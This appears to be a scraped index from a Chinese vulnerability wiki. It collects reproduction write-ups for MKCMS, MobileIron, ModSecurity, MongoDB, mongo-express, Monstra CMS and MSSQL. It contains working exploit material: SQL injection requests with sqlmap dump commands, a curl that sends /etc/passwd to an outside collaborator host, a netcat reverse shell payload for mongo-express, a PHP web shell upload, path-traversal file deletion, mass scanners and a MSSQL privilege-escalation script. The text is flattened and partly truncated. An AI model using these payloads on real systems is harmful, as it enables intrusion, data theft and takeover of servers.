GitbookFile Modify: 2021-07-15 19:56:46 "},"Web安全/MKCMS/MKCMS v5.0 _ucenter_reg.php前台注入漏洞/MKCMS v5.0 _ucenter_reg.php前台注入漏洞.html":{"url":"Web安全/MKCMS/MKCMS v5.0 _ucenter_reg.php前台注入漏洞/MKCMS v5.0 _ucenter_reg.php前台注入漏洞.html","title":"MKCMS v5.0 _ucenter_reg.php前台注入漏洞","keywords":"","body":"MKCMS v5.0 /ucenter/reg.php前台sql注入漏洞 一、漏洞简介 二、漏洞影响 MKCMS v5.0 三、复现过程 漏洞出现在/ucenter/reg.php第7-19行: if(isset($_POST['submit'])){ $username = stripslashes(trim($_POST['name'])); // 检测用户名是否存在 $query = mysql_query(\"select u_id from mkcms_user where u_name='$username'\"); if(mysql_fetch_array($query)){ echo 'alert(\"用户名已存在，请换个其他的用户名\");window.history.go(-1);'; exit; } $result = mysql_query('select * from mkcms_user where u_email = \"'.$_POST['email'].'\"'); if(mysql_fetch_array($result)){ echo 'alert(\"邮箱已存在，请换个其他的邮箱\");window.history.go(-1);'; exit; } 注册用户名时$username参数传到后台后经过stripslashes()函数处理，而stripslashes()函数的作用是删除addslashes() 函数添加的反斜杠。这里就很郁闷了，过滤反斜杠干嘛？ 当前页面无输出点，只是返回一个注册/未注册（通过if判断true或者false)，可以使用布尔盲注来解决这个问题 POC： POST /ucenter/reg.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/ucenter/reg.php Content-Type: application/x-www-form-urlencoded Content-Length: 52 Connection: close Cookie: PHPSESSID=cb8e6ccde6cf9050972fa9461d606be3 Upgrade-Insecure-Requests: 1 name=test' AND 1=1 AND 'inject'='inject&email=sss%40qq.com&password=ssssss&submit= 将POC中的数据包保存下来丢给sqlmap跑即可。 获取管理员账号： sqlmap -r inject.txt -D mkcms -T mkcms_manager --dump 参考链接 https://xz.aliyun.com/t/4189\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:47 "},"Web安全/MKCMS/MKCMS v5.0 任意密码重置漏洞/MKCMS v5.0 任意密码重置漏洞.html":{"url":"Web安全/MKCMS/MKCMS v5.0 任意密码重置漏洞/MKCMS v5.0 任意密码重置漏洞.html","title":"MKCMS v5.0 任意密码重置漏洞","keywords":"","body":"MKCMS v5.0 任意密码重置漏洞 一、漏洞简介 二、漏洞影响 MKCMS v5.0 三、复现过程 漏洞出现在/ucenter/repass.php第1-44行: debug = false; $mailType = \"HTML\"; //信件类型，文本:text；网页：HTML $email = $email; //收件人邮箱 $emailTitle = \"\".$mkcms_name.\"用户找回密码\"; //邮件主题 $emailBody = \"亲爱的\".$username.\"：感谢您在我站注册帐号。您的初始密码为123456如果此次找回密码请求非你本人所发，请忽略本邮件。-------- \".$mkcms_name.\" 敬上\"; // sendmail方法 // 参数1是收件人邮箱 // 参数2是发件人邮箱 // 参数3是主题（标题） // 参数4是邮件主题（标题） // 参数4是邮件内容 参数是内容类型文本:text 网页:HTML $rs = $smtp->sendmail($email, $smtpMail, $emailTitle, $emailBody, $mailType); if($rs==true){ echo 'alert(\"请登录到您的邮箱查看您的密码！\");window.history.go(-1);'; }else{ echo \"找回密码失败\"; } } } } ?> 本质上来说此处是一个逻辑问题，程序未通过邮箱等验证是否为用户本身就直接先在第13-14行把用户密码重置为123456了，根本没管邮件发送成功没有。 poc 构造如下poc.html,并访问poc.html，然后用123456密码登录即可 history.pushState('', '', '/') 参考链接 https://xz.aliyun.com/t/4189\\#toc-1 https://cisk123456.blogspot.com/2019/04/mkcms-v50.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:48 "},"Web安全/MKCMS/MKCMS v6.2 _ucenter_active.php前台sql注入漏洞/MKCMS v6.2 _ucenter_active.php前台sql注入漏洞.html":{"url":"Web安全/MKCMS/MKCMS v6.2 _ucenter_active.php前台sql注入漏洞/MKCMS v6.2 _ucenter_active.php前台sql注入漏洞.html","title":"MKCMS v6.2 _ucenter_active.php前台sql注入漏洞","keywords":"","body":"MKCMS v6.2 /ucenter/active.php前台sql注入漏洞 一、漏洞简介 二、漏洞影响 MKCMS v6.2 三、复现过程 /ucenter/active.php?verify=1存在注入 /ucenter/active.php sqlmap直接跑即可 [INFO] GET parameter 'verify' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable [INFO] GET parameter 'verify' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable 参考链接 https://xz.aliyun.com/t/7580\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:49 "},"Web安全/MKCMS/MKCMS v6.2 _ucenter_reg.php前台sql注入漏洞/MKCMS v6.2 _ucenter_reg.php前台sql注入漏洞.html":{"url":"Web安全/MKCMS/MKCMS v6.2 _ucenter_reg.php前台sql注入漏洞/MKCMS v6.2 _ucenter_reg.php前台sql注入漏洞.html","title":"MKCMS v6.2 _ucenter_reg.php前台sql注入漏洞","keywords":"","body":"MKCMS v6.2 /ucenter/reg.php前台sql注入漏洞 一、漏洞简介 二、漏洞影响 MKCMS v6.2 三、复现过程 /ucenter/reg.php的name参数，存在注入 /ucenter/reg.php 参考链接 https://xz.aliyun.com/t/7580\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:49 "},"Web安全/MKCMS/MKCMS v6.2 任意用户密码找回漏洞/MKCMS v6.2 任意用户密码找回漏洞.html":{"url":"Web安全/MKCMS/MKCMS v6.2 任意用户密码找回漏洞/MKCMS v6.2 任意用户密码找回漏洞.html","title":"MKCMS v6.2 任意用户密码找回漏洞","keywords":"","body":"MKCMS v6.2 任意用户密码找回漏洞 一、漏洞简介 二、漏洞影响 MKCMS v6.2 三、复现过程 任意用户密码找回这个问题主要是/ucenter/repass.php代码里，找回密码的逻辑有问题，第10行查询到username、 email能对应上之后，14行就直接重置密码了。。。而且密码的范围在12行有写，只有90000种可能，重置之后，burp跑一下不就ok了？（当然要结合验证码重用才能有效爆破） 参考链接 https://xz.aliyun.com/t/7580\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:50 "},"Web安全/MKCMS/MKCMS v6.2 备份文件路径可猜解/MKCMS v6.2 备份文件路径可猜解.html":{"url":"Web安全/MKCMS/MKCMS v6.2 备份文件路径可猜解/MKCMS v6.2 备份文件路径可猜解.html","title":"MKCMS v6.2 备份文件路径可猜解","keywords":"","body":"MKCMS v6.2 备份文件路径可猜解 一、漏洞简介 二、漏洞影响 MKCMS v6.2 三、复现过程 /backupdata/movie.sql /admin/cms_backup.php 全局搜DATA_NAME变量，是安装时候设置的数据库名 默认的DATA_NAME值是movie 参考链接 https://xz.aliyun.com/t/7580\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:51 "},"Web安全/MKCMS/MKCMS v6.2 验证码重用/MKCMS v6.2 验证码重用.html":{"url":"Web安全/MKCMS/MKCMS v6.2 验证码重用/MKCMS v6.2 验证码重用.html","title":"MKCMS v6.2 验证码重用","keywords":"","body":"MKCMS v6.2 验证码重用 一、漏洞简介 二、漏洞影响 MKCMS v6.2 三、复现过程 /admin/cms_login.php验证码处的逻辑如下，比较session中的验证码和输入的是否一致，不一致就进入alert_href，这个js跳转，实际是在刷新页面 /admin/cms_login.php: 跳转后就会刷新验证码，然而我用的是burp，默认是不解析js的 全局搜索这个$_SESSION['verifycode']，发现只在/system/verifycode.php有赋值，也就是说，如果使用验证码后，我们不跟随js跳转，就不会重置验证码，验证码也就能被重复使用了 参考链接 https://xz.aliyun.com/t/7580\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:52 "},"Web安全/MKCMS/MKCMS v7.0.3 sql注入漏洞审计/MKCMS v7.0.3 sql注入漏洞审计.html":{"url":"Web安全/MKCMS/MKCMS v7.0.3 sql注入漏洞审计/MKCMS v7.0.3 sql注入漏洞审计.html","title":"MKCMS v7.0.3 sql注入漏洞审计","keywords":"","body":"MKCMS v7.0.3 sql注入漏洞审计 漏洞简介 米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需 3 分钟即可建立一个海量的视频讯息的行业网站。米酷CMS v7.0.3版本admin/model/admin_edit.php、ucenter/reg.php等文件存在漏洞，攻击者可以利用漏洞进行sql注入攻击。 漏洞影响 米酷CMS v7.0.3 第一处注入 漏洞文件 ucenter/reg.php （前台文件） 分析在reg.php这个文件中，第9行处对$username这个参数进行了查询拼接， 但是在第7行处，$username的值是来自于POST传递的name参数，当name参数到达reg.php这个文件之后，stripslashes（）函数将name的值进行了去除“\\”处理，根据include，跳转到/system/library.php中，我们可以发现这里系统对GET、POST等参数进行了addslashes_deep（）函数处理，即对参数传递时加上了一个“\\”，问题就出在这里，前端用户进行提交的name参数，经过了addslashes_deep（）函数处理加上了一个“\\”，到达reg.php页面又使用stripslashes（）函数将name的值进行了去除“\\”处理，这就导致出现了无过滤拼接。 第二处注入 漏洞文件admin/model/admin_edit.php（后台文件） 分析在admin_edit.php文件第10行处，系统进行了数据库查询，拼接了两个参数，一个是POST传递的a_name，一个是GET传递的id，可以看出，系统并未对参数在这里做任何的过滤处理， 本地复现 环境搭建由于需要设置伪静态，这里用的是宝塔面板源码地址：米酷CMS v7.0.3，提取码：uy5u（环境搭建教程在源码中附有）搭建完成：后台账号密码为admin/admin 第一处漏洞测试来到前台漏洞点，http://mkcms.com/ucenter/reg.php（mkcms.com为本地静态!)抓包注册admin用户，提示已存在在name参数处构造Payload：+and+'1'='2 在name参数处构造Payload：+and+'1'='1 根据不同的返回值可以说明构造的payload被拼接到数据库进行了判断处理.使用sqlmap验证 第二处漏洞测试定位到漏洞点，url：http://mkcms.com/admin/cms_admin_edit.php?id=1（mkcms.com为本地静态!)使用单引号进行判断构造payload：id=1+and+if(1>2,1,sleep(3))可以看到，数据库执行了sleep（）函数。 直接丢到sqlmap进行注入 参考 https://blog.csdn.net/sjyyyyyyyy/article/details/111606650 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:53 "},"Web安全/MobileIron/（CVE-2020-15505）MobileIron 远程命令执行漏洞/（CVE-2020-15505）MobileIron 远程命令执行漏洞.html":{"url":"Web安全/MobileIron/（CVE-2020-15505）MobileIron 远程命令执行漏洞/（CVE-2020-15505）MobileIron 远程命令执行漏洞.html","title":"（CVE-2020-15505）MobileIron 远程命令执行漏洞","keywords":"","body":"（CVE-2020-15505）MobileIron 远程命令执行漏洞 一、漏洞简介 MobileIron Sentry等都是美国思可信（MobileIron）公司的产品。MobileIron Sentry是一款智能网关产品。MobileIron Core是一款MobileIron平台的管理控制台组件。MobileIron Connector是一款MobileIron平台的连接器组件。 MobileIron Core 10.6及之前版本、Connector 10.6及之前版本和Sentry 9.8及之前版本中存在安全漏洞。远程攻击者可利用该漏洞执行任意代码。 二、漏洞影响 MobileIron Core 10.6及之前版本、Connector 10.6及之前版本和Sentry 9.8及之前版本 三、复现过程 访问https://www.0-sec.org/mifs/.;/services/LogService MobileIron远程命令执行漏洞/media/rId24.png) 确认存在该漏洞位置连接。 在vps执行 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Groovy \"/bin/bash\" \"-c\" \"\" > exp.ser MobileIron远程命令执行漏洞/media/rId25.png) 然后再执行 python hessian.py -u 'https://target.0-sec.org/mifs/.;/services/LogService' -p exp.ser MobileIron远程命令执行漏洞/media/rId26.png) dnslog 使用姿势补充 curl http://xxxxx.burpcollaborator.net -F \"file=@/etc/passwd;\" ping `whoami`.xxx.dnslog.cn\" MobileIron远程命令执行漏洞/media/rId27.png) poc https://download.0-sec.org/Web安全/MobileIron/CVE-2020-15505.zip 参考链接 https://github.com/iamnoooob/CVE-Reverse Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:54 "},"Web安全/ModSecurity/（CVE-2019-19886）ModSecurity 拒绝服务漏洞/（CVE-2019-19886）ModSecurity 拒绝服务漏洞.html":{"url":"Web安全/ModSecurity/（CVE-2019-19886）ModSecurity 拒绝服务漏洞/（CVE-2019-19886）ModSecurity 拒绝服务漏洞.html","title":"（CVE-2019-19886）ModSecurity 拒绝服务漏洞","keywords":"","body":"（CVE-2019-19886）ModSecurity 拒绝服务漏洞 一、漏洞简介 2020年1月20日，Trustwave SpiderLabs公开了其维护的开源WAF引擎ModSecurity的1个拒绝服务（DoS）漏洞，漏洞编号为：CVE-2019-19886。此漏洞影响ModSecurity的3.0到3.0.3版本。 二、漏洞影响 ModSecurity 3.0到3.0.3版本 三、复现过程 漏洞分析 通过Github项目的releases跟踪: https://github.com/SpiderLabs/ModSecurity/releases ModSecurity拒绝服务漏洞/media/rId25.png) 发现了airween的一个pr: https://github.com/SpiderLabs/ModSecurity/pull/2201 被官方采纳并归并到了 v3/master ModSecurity拒绝服务漏洞/media/rId26.png) 来看看他究竟修改了什么: https://github.com/SpiderLabs/ModSecurity/pull/2201/commits/c7ad6c7613de3c1ac2ad1b4055f0ded22b522027 存在漏洞的代码如下： ModSecurity拒绝服务漏洞/media/rId27.png) 可以看见这里将Cookie的值带入代码，先以 ; 符号进行分割，进入for循环，再以 = 符号进行分割赋值，而后使用正常数组下标的表达方式进入功能中，那么问题出在了哪里？ 我们再来看修复的代码： ModSecurity拒绝服务漏洞/media/rId28.png) 简单阅读代码和注释就能了解到，它就是处理两种非正常的Cookie值: Cookie: ;;foo=bar \\ Cookie: =bar; 换句话说就是ModSecurity原来在处理Cookie内容的时候过于信任用户的输入，这也是安全的一个大忌讳: 一切用户的输入都是不可信的 ！ 为什么会拒绝服务呢？可以理解为数组越界，类似: ModSecurity拒绝服务漏洞/media/rId29.png) 漏洞复现 很明显，通过漏洞跟踪已经知道了漏洞攻击方式那就是构建恶意(畸形)的 Cookie 头 Curl命令测试: curl -s -H 'Cookie: =test' 'http://test/' ModSecurity拒绝服务漏洞/media/rId31.png) 根据奇安信CERT的描述: 不断向服务器发送此类请求将使工作线程反复崩溃 ，那我们可以重复这个请求造成拒绝服务效果。 参考链接 https://gh0st.cn/archives/2020-01-24/1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:55 "},"Web安全/Mongo DB/Mongo DB未授权访问/Mongo DB未授权访问.html":{"url":"Web安全/Mongo DB/Mongo DB未授权访问/Mongo DB未授权访问.html","title":"Mongo DB未授权访问","keywords":"","body":"MongoDB未授权访问 一、漏洞简介 MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。 使用默认 mongod 命令启动 Mongodb 机器可以被公网访问 在公网上开放了 Mongodb 端口 数据库隐私泄露 数据库被清空 数据库运行缓慢 二、影响范围 三、复现过程 1. 扫描探测 2. 下载： http://nmap.org/svn/scripts/mongodb-info.nse nmap -p 27017 --script mongodb-info vim /etc/mongodb.conf dbpath = /data/ logpath = /var/logs/mongodb.log ##port = 27017 ##fork = true bind_ip = 0.0.0.0 ./mongod –config mongodb.conf //启动mongodb加载配置mongodb.conf 1.1 基础 https://www.jianshu.com/p/8bf26effa737 http://www.runoob.com/mongodb/mongodb-tutorial.html https://itbilu.com/database/mongo/E1tWQz4_e.html 1.2 批量扫描未授权 import socket import sys import pymongo ipcons = [] def Scanner(ip): global ipcons sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sk.settimeout(0.3) try: sk.connect((ip,27017)) ipcons.append(ip) sk.close() except Exception: pass def ip2num(ip): ip=[int(x) for x in ip.split('.')] return ip[0] >24, (num & 0x00ff0000) >>16, (num & 0x0000ff00) >>8, num & 0x000000ff ) def get_ip(ip): start,end = [ip2num(x) for x in ip.split(' ') ] return [ num2ip(num) for num in range(start,end+1) if num & 0xff ] startIp = sys.argv[1] endIp = sys.argv[2] iplist = get_ip(sys.argv[1]+\" \"+sys.argv[2]) for i in iplist: Scanner(i) def connMon(ip_addr): print ' Connect mongodb: ' + ip_addr + ':27017' try: conn = pymongo.MongoClient(ip_addr,27017,socketTimeoutMS=3000) dbname = conn.database_names() print \"success\" except Exception as e: print \"error\" print ipcons for ipaddr in ipcons: connMon(ipaddr) print \"=================\" 1.3 shodan扫描脚本 ##!/usr/bin/python ## -*- coding: UTF-8 -*- ''' @Author：joy_nick @博客：http://byd.dropsec.xyz/ ''' import shodan import os iplist = [] ip_list = [] shodan_ip_list = [] def shodanSearch(keywords): SHODAN_API_KEY = \"your key\" api = shodan.Shodan(SHODAN_API_KEY) total = 0 try: results = api.search(keywords) total = int(results['total']) for result in results['matches']: ##iplist.append({\"ip\":result['ip_str'],\"country\":result['location']['country_name']}) iplist.append(result['ip_str']) for i in range(len(iplist)): ip_list = iplist[i].encode('utf-8') shodan_ip_list.append(ip_list) s = '\\n'.join(shodan_ip_list) with open('shodan_ip_list.txt','w') as output: output.write(s) except shodan.APIError, e: print 'Error: %s' % e if __name__ == '__main__': shodanSearch('redis') 查询操作 2. 爆破脚本 https://github.com/netxfly/x-crack 4. 防范措施 (1).新建管理账户开启MongoDB授权新建终端[参数默认可以不加，若有自定义参数，才要加上，下同] mongod --port 27017 --dbpath /data/db1 另起一个终端，运行下列命令 mongo --port 27017 use admin db.createUser( { user: \"adminUser\", pwd: \"adminPass\", roles: [ { role: \"userAdminAnyDatabase\", db: \"admin\" } ] } ) 管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass (2).本地访问bind 127.0.0.1 (3).修改默认端口修改默认的mongoDB端口(默认为: TCP 27017)为其他端口 (4).禁用HTTP和REST端口MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择--nohttpinterface 参数nohttpinterface = false(5).开启日志审计功能审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情(6).开启auth认证 /etc/mongodb.conf　　 auth = true 其他:http://www.mottoin.com/10560 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:58 "},"Web安全/Mongo express/（CVE-2019-10758）Mongo expres rce/（CVE-2019-10758）Mongo expres rce.html":{"url":"Web安全/Mongo express/（CVE-2019-10758）Mongo expres rce/（CVE-2019-10758）Mongo expres rce.html","title":"（CVE-2019-10758）Mongo expres rce","keywords":"","body":"（CVE-2019-10758）Mongo expres rce 一、漏洞简介 漏洞问题出在lib/bson.js中的toBSON()函数中，路由 /checkValid 从外部接收输入，并调用了存在 RCE 漏洞的代码，由此存在被攻击的风险，可在服务器上进行任意命令执行。 二、漏洞影响 mongo-express \\ 三、复现过程 https://github.com/ianxtianxt/CVE-2019-10758 安装环境 docker run -p 27017:27017 -d mongo npm install mongo-express@0.53.0 cd node_modules/mongo-express/ && node app.js cURL exploit curl 'http://www.0-sec.org:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw==' --data 'document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")' Mongoexpresrce/media/rId26.png) curl 'http://www.0-sec.org:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw==' --data 'document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"echo Str1am > file.txt\")' Mongoexpresrce/media/rId27.png) Script exploit node main.js main.js exploit = \"this.constructor.constructor(\\\"return process\\\")().mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator')\" var bson = require('mongo-express/lib/bson') bson.toBSON(exploit) 补充 mongo-express远程代码执行，反弹shell代码如下： POST BODY 1: document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"mkfifo /tmp/f\") POST BODY 2： document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"cat /tmp/f | /bin/sh -i 2>%261 | nc x.x.x.x 666 >/tmp/f\") 批量监测脚本【只放核心代码】 payload = r'document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"echo 111111\")' def http_request(url,path_out): try: print(\"Trying:\" + url + ' ' + '[' + str(left) + '/' + str(countLines) + ']') vulurl = url + \"/checkValid\" r = requests.post(url=vulurl, headers=headers, data=payload, timeout=10, verify= False) if r.status_code == 200 and 'Valid' in r.text: print(\"\\033[1;40;32m'Good Found!' {}\\033[0m\".format(vulurl)) #printGreen(\"[+]\" + url) with open(path_out,'a') as f: f.write(vulurl + '\\n') else: print(\"[-]\" + \"r.status_code:\" + str(r.status_code) + \",\" + \"raise.text:\" + r.text) except Exception as err: print(err) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:00 "},"Web安全/Monstra CMS/（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞/（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞.html":{"url":"Web安全/Monstra CMS/（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞/（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞.html","title":"（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞","keywords":"","body":"（CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞 一、漏洞简介 Monstra CMS是乌克兰Sergey Romanenko软件开发者的一套基于PHP的轻量级内容管理系统（CMS）。 Monstra CMS 3.0.4版本中的index.php脚本存在安全漏洞，该漏洞源于程序没有正确验证文件扩展名。远程攻击者可借助特制HTTP请求利用该漏洞上载和执行任意PHP代码。 二、漏洞影响 Monstra CMS 3.0.4 三、复现过程 访问https://www.0-sec.org/monstra/admin/index.php?id=filesmanager&path=uploads/ POST /monstra/admin/index.php?id=filesmanager HTTP/1.1 Host: www.0-sec.org Content-Length: 548 Cache-Control: max-age=0 Origin: https://www.0-sec.org Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytRfyCkYq8NvztDBf User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: https://www.0-sec.org/monstra/admin/index.php?id=filesmanager Accept-Encoding: gzip, deflate Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,fr;q=0.7 Cookie: PHPSESSID=eej6e0lqi191k2frqc2hl3v6d0; _ga=GA1.1.405623579.1579949328; _gid=GA1.1.2042923722.1579949328 Connection: close ------WebKitFormBoundarytRfyCkYq8NvztDBf Content-Disposition: form-data; name=\"csrf\" 2e6ae2353998caa319aae262b113c6b3f17a9636 ------WebKitFormBoundarytRfyCkYq8NvztDBf Content-Disposition: form-data; name=\"file\"; filename=\"shell.php7\" Content-Type: application/octet-stream \"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"\"; die; }?> ------WebKitFormBoundarytRfyCkYq8NvztDBf Content-Disposition: form-data; name=\"upload_file\" Upload ------WebKitFormBoundarytRfyCkYq8NvztDBf-- https://www.0-sec.org/monstra/public/uploads/shell.php7?cmd=id Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:02 "},"Web安全/Monstra CMS/Monstra CMS = 3.0.4 任意文件删除漏洞/Monstra CMS = 3.0.4 任意文件删除漏洞.html":{"url":"Web安全/Monstra CMS/Monstra CMS = 3.0.4 任意文件删除漏洞/Monstra CMS = 3.0.4 任意文件删除漏洞.html","title":"Monstra CMS = 3.0.4 任意文件删除漏洞","keywords":"","body":"Monstra CMS \\ 一、漏洞简介 慎用 二、漏洞影响 Monstra CMS \\ 三、复现过程 http://www.0-sec.org/admin/index.php?id=backup&delete_file=/.......//./.......//./index.php&token=f62369587a94433bb2c3c00264e8705171c6189f Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:01 "},"Web安全/Mssql/Mssql 受信用数据库提权/Mssql 受信用数据库提权.html":{"url":"Web安全/Mssql/Mssql 受信用数据库提权/Mssql 受信用数据库提权.html","title":"Mssql 受信用数据库提权","keywords":"","body":"Mssql 受信用数据库提权 0x01 前提 前提条件，我们获取sqlserver一个名为MyAppUser01 的用户密码，这个用户对MyTestdb01有db_owner权限，并且对MyTestdb01受信用，然后我们可以利用这个用户提权到syadmin权限 测试服务器版本 0x02创建用户，受信用数据库 1.创建数据库 CREATE DATABASE MyTestdb01 SELECT suser_sname(owner_sid) FROM sys.databases WHERE name = 'MyTestdb01' 2.创建用户 创建一个测试用户 CREATE LOGIN MyAppUser01 WITH PASSWORD = 'MyPassword!'; 这里可以看到用户为public角色 3.在\\\"MyTestdb01\\\"数据库中为\\\"MyAppUser01\\\"分配\\\"db_owner\\\"角色, DB_owner权限，DB是database的缩写，owner即拥有者的意思。它是指某个数据库的拥有者，它拥有了对数据库的修改、删除、新增数据表，执行大部分存储过程的权限。 USE MyTestdb01 ALTER LOGIN [MyAppUser01] with default_database = [MyTestdb01]; CREATE USER [MyAppUser01] FROM LOGIN [MyAppUser01]; EXEC sp_addrolemember [db_owner], [MyAppUser01]; 4.确认\\\"MyAppUser01\\\"已添加为db_owner select rp.name as database_role, mp.name as database_user from sys.database_role_members drm join sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join sys.database_principals mp on (drm.member_principal_id = mp.principal_id) Myappuser01确实为db_owner的权限 查看myappusr01的属性也可以看到 5.将\\\"MyTestdb01\\\"数据库设置为受信任。 ALTER DATABASE MyTestdb01 SET TRUSTWORTHY ON 6.下面的查询将返回SQL Server实例中的所有数据库，并且应将\\\"MyTestdb01 \\\"和\\\"MSDB\\\"数据库标记为可信任。 SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name; \\\"1\\\"就是受信用 7.开启xp_cmdshell EXEC sp_configure 'show advanced options',1 RECONFIGURE GO EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE GO 0x02 提权 1.使用MyAppUser01用户登录，新建查询，看看我们的权限，这里不要用之前的查询，因为那是sa的查询看看我们的是否为sysadmin 2.新建一个sp_elevate_me查询 USE MyTestdb01 GO CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'MyAppUser01','sysadmin' GO 3.提权至sysadmin USE MyTestdb01 EXEC sp_elevate_me 再次检查权限 已经是sysadmin权限了，查看用户的属性也可以看到已经到sysadmin权限了 这里可以利用脚本已经一键利用 poc Invoke-SqlServer-Escalate-Dbowner.psm1 function Invoke-SqlServer-Escalate-DbOwner { Invoke-SqlServer-Escalate-DbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\\SQLEXPRESS [*] Attempting to Connect to SQLServer\\SQLEXPRESS as myappuser... [*] Connected. [*] Enumerating accessible trusted databases owned by sysadmins... [*] 3 accessible databases found. [*] Checking if current user has db_owner role in any of them... [*] myappuser as db_owner role in 2 databases. [*] Attempting to evelate myappuser to sysadmin via master database... [*] Success! - myappuser is now a sysadmin. [*] All done. .EXAMPLE Creating new sysadmin, using a user that has the db_owner role in a trusted database owned by a sysadmin. PS C:\\> Invoke-SqlServer-Escalate-DbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\\SQLEXPRESS -newuser eviladmin -newPass MyPassword! [*] Attempting to Connect to SQLServer1\\SQLEXPRESS as myappuser... [*] Connected. [*] Enumerating accessible trusted databases owned by sysadmins... [*] Found 2 trusted databases owned by a sysadmin. [*] Checking if myappuser the has db_owner role in any of them... [*] myappuser has db_owner role in 1 of the databases. [*] Attempting to create and add eviladmin to the sysadmin role via the MyAppDb database... [*] Success! - eviladmin is now a sysadmin. [*] All done. .LINK http://www.netspi.com .NOTES Author: Scott Sutherland - 2014, NetSPI Version: Invoke-SqlServer-Escalate-DbOwner.psm1 v1.0 Comments: Should work on SQL Server 2005 and Above. #> [CmdletBinding()] Param( [Parameter(Mandatory=$false, HelpMessage='Set SQL Login username.')] [string]$SqlUser, [Parameter(Mandatory=$false, HelpMessage='Set SQL Login password.')] [string]$SqlPass, [Parameter(Mandatory=$false, HelpMessage='Set SQL Login username.')] [string]$newuser, [Parameter(Mandatory=$false, HelpMessage='Set SQL Login password.')] [string]$newPass, [Parameter(Mandatory=$true, HelpMessage='Set target SQL Server instance.')] [string]$SqlServerInstance ) # ----------------------------------------------- # Connect to the sql server # ----------------------------------------------- # Create fun connection object $conn = New-Object System.Data.SqlClient.SqlConnection # Set authentication type and create connection string if($SqlUser -and $SqlPass){ # SQL login $conn.ConnectionString = \"Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;\" [string]$ConnectUser = $SqlUser }else{ # Trusted connection $conn.ConnectionString = \"Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;\" $UserDomain = [Environment]::UserDomainName $Username = [Environment]::UserName $ConnectUser = \"$UserDomain\\$Username\" } # Status User write-host \"[*] Attempting to Connect to $SqlServerInstance as $ConnectUser...\" # Attempt database connection try{ $conn.Open() write-host \"[*] Connected.\" -foreground \"green\" }catch{ $ErrorMessage = $_.Exception.Message write-host \"[*] Connection failed\" -foreground \"red\" write-host \"[*] Error: $ErrorMessage\" -foreground \"red\" Break } # ----------------------------------------------- # Create data tables for later # ----------------------------------------------- # Create data table to house list of trusted databases owned by a sysadmin $IsSysAdmin = New-Object System.Data.DataTable 